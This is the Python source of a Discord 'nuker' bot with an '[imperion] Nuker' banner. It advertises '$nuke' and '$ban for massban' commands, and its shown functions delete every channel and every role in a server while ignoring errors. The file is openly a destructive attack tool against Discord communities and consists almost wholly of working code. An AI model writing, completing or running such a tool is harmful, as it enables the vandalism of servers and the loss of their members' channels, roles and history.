import discord
import os
import ctypes
import threading
from discord.ext import commands
import requests
from colorama import Fore, init
import yaml
import time
import random, sys
init(autoreset=True)

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')
def title(content):
    try: ctypes.windll.kernel32.SetConsoleTitleW(content)
    except: pass

purp = Fore.MAGENTA 
pink = Fore.LIGHTMAGENTA_EX 
gray = Fore.LIGHTBLACK_EX 
whit = Fore.WHITE 
red = Fore.RED 
lred = Fore.LIGHTRED_EX 

cls()
title("[imperion] Nuker")
print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
print(f"""
{red}                                                                            
{red}                                         _                        _           
{red}                                        <_>._ _ _  ___  ___  _ _ <_> ___ ._ _ 
{red}                                        | || ' ' || . \/ ._>| '_>| |/ . \| ' |
{red}                                        |_||_|_|_||  _/\___.|_|  |_|\___/|_|_|
{red}                                                  |_|          {gray}           By Niju                         
{red}                                       
{red}                                                         
""")
print(f"{pink}>{red} $nuke to nuke and $ban for massban")

async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except:
            continue
    return deleted


